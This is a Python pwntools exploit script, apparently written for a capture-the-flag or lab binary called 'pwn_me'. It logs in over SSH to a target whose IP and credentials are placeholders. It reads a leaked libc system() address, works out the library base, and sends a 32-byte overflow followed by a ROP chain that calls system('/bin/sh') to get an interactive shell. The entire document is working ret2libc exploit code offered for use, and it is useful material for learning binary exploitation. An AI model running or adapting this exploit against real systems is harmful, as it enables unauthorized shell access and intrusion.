#!/usr/bin/python3
from pwn import *

#Usage: python3 exploit.py

file=ELF("./pwn_me")#----> Initialize the binary.
elflib=ELF("./libc.so.6")#---> Initialize the library.

addr="<TARGET_IP_HERE>"#---> IP Address of the target machine.

conn=ssh(user="<USERNAME_HERE>",host=addr,password="<PASSWORD_HERE>")#---> pwntools could not be installed on the machine, but pwntools already has a function to execute command over SSH
proc=conn.process("./pwn_me",cwd="<SET_TO_LOCATION_OF_THE_USER>")#---> create a process for pwn_me in the home directory.

print(proc.recvline().decode())#---> Receive first line printed by the program.
SYS_POINTER=int(proc.recvline().rstrip().split()[3],16) #---> Receive second line which contains the leaked location and get the leaked location.
systemloc=elflib.symbols["system"]#---> Get location of the 'system' symbol.
elflib.address=SYS_POINTER-systemloc#---> Set address of the library.
print("system Symbol Location: ", hex(systemloc),"\nExploit location:",hex(SYS_POINTER-systemloc))#---> Print out hex location for system symbol.
rop = ROP(elflib)#---> Definie ROP for the library.
rop.raw(rop.find_gadget(['ret']))
rop.system(next(elflib.search(b'/bin/sh\x00')))

payload=b"A"*32+rop.chain()#--->Add the chain and extra character.
print("Exploit payload",payload)#---> Just for reference.
proc.sendline(payload)#---> Sending the created payload to the process.
proc.interactive()#---> Enable interaction with the process.
